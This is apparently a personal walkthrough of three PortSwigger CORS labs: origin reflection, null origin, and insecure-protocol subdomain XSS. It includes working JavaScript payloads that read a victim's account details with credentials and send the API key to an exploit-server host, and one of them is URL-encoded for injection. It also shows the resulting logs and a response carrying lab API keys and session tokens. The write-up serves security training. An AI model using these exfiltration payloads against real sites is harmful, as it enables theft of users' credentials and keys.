# Cross Origin Resource Sharing

## CORS vulnerability with basic origin reflection
https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

Reading the source code after logging in reveals an endpoint which was used

![](Pasted%20image%2020220514111546.png)

```html
<div>Your API Key is: <span id=apikey></span></div>
<script>
	fetch('/accountDetails', {credentials:'include'})
	.then(r => r.json())
	.then(j => document.getElementById('apikey').innerText = j.apikey)
</script>
```

Deliver this exploit to the user through the exploit server

```
...
Origin: https://exploit-ac9f1f6d1e659a4fc0f1543401340027.web-security-academy.net
```

```html
<div>Your API Key is: <span id=apikey></span></div>
<script>
    var EXPURL = "https://exploit-ac9f1f6d1e659a4fc0f1543401340027.web-security-academy.net";
    fetch('https://ac0e1f7b1ed99a63c0545434007100a1.web-security-academy.net/accountDetails', {credentials:'include'})
        .then(r => r.json())
        .then(j => fetch(EXPURL+'/'+j.apikey, {credentials:'include'}))
</script>
```

Check the logs

```
172.31.30.154   2022-05-28 17:01:14 +0000 "GET /Rsa2DyCqkImZEW6285UCrbS17fwEXdJp HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36"
116.14.150.8    2022-05-28 17:01:14 +0000 "GET / HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36"
```

## CORS vulnerability with trusted null origin
https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Origin: null
```

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<div>Your API Key is: <span id=apikey></span></div>
<script>
    var EXPURL = 'https://exploit-0a2c002303c92b3ac0d4089b01ae000c.web-security-academy.net/';
    fetch('https://0aa300da033a2b7dc010085d009c003c.web-security-academy.net/accountDetails', {credentials:'include'})
        .then(r => r.json())
        .then(j => fetch(EXPURL+'/'+j.apikey, {credentials:'include'}))
</script>"></iframe>
```
## CORS vulnerability with trusted insecure protocols
https://portswigger.net/web-security/cors/lab-breaking-https-attack

On looking at the stockcheck function, you notice that a subdomain is opened, likely where its exploited at

```
<script>
    const stockCheckForm = document.getElementById("stockCheckForm");
    stockCheckForm.addEventListener("submit", function(e) {
	const data = new FormData(stockCheckForm);
	window.open('http://stock.0a660041031c2f37c0fe4299000b0099.web-security-academy.net/?productId=1&storeId=' + data.get('storeId'), 'stock', 'height=10,width=10,left=10,top=10,menubar=no,toolbar=no,location=no,status=no');
	e.preventDefault();
    });
</script>
```

You can inject `<script>alert(1)</script>` into the productId parameter. You can identify this by testing the parameters, and notice the contents of productId is reflected if not valid

![image](https://user-images.githubusercontent.com/18213722/201603007-6a3e12d1-639c-4de7-9896-89233ab66b68.png)

I url encoded this XSS payload 

```js
<script> var EXPURL = 'https://exploit-0a7400b003922ffec0c34243016100d6.exploit-server.net/?';
    fetch('https://0a660041031c2f37c0fe4299000b0099.web-security-academy.net/accountDetails', {credentials:'include'})
        .then(r => r.json())
        .then(j => fetch(EXPURL+j.apikey, {credentials:'include'}) )
</script>
```
Afterward used this Exploit Server Payload

```js
<script>
var data = "%3Cscript%3E%20var%20EXPURL%20%3D%20%27https%3A%2F%2Fexploit%2D0a7400b003922ffec0c34243016100d6%2Eexploit%2Dserver%2Enet%2F%3F%27%3B%0A%20%20%20%20fetch%28%27https%3A%2F%2F0a660041031c2f37c0fe4299000b0099%2Eweb%2Dsecurity%2Dacademy%2Enet%2FaccountDetails%27%2C%20%7Bcredentials%3A%27include%27%7D%29%0A%20%20%20%20%20%20%20%20%2Ethen%28r%20%3D%3E%20r%2Ejson%28%29%29%0A%20%20%20%20%20%20%20%20%2Ethen%28j%20%3D%3E%20fetch%28EXPURL%2Bj%2Eapikey%2C%20%7Bcredentials%3A%27include%27%7D%29%20%29%0A%3C%2Fscript%3E";

window.open('http://stock.0a660041031c2f37c0fe4299000b0099.web-security-academy.net/?productId='+data+'&storeId=1', 'stock', 'height=10,width=10,left=10,top=10,menubar=no,toolbar=no,location=no,status=no');
</script>                   
```

Other - Subdomain reflection test

```
GET /accountDetails HTTP/1.1
Host: 0a660041031c2f37c0fe4299000b0099.web-security-academy.net
Origin: http://stock.0a660041031c2f37c0fe4299000b0099.web-security-academy.net
Cookie: session=s2fGlgSGMUqAtID7Toxuk6vxzAV6kkay
Connection: close
```

Passed through to access control allow origin
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://stock.0a660041031c2f37c0fe4299000b0099.web-security-academy.net
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 189

{
  "username": "wiener",
  "email": "",
  "apikey": "xzVvSPRWWgCfiqTxo64ZFVJfTgO8NEbu",
  "sessions": [
    "caR76YazqabcI0oVd4zn87BAe3Anp1GT",
    "s2fGlgSGMUqAtID7Toxuk6vxzAV6kkay"
  ]
}
```
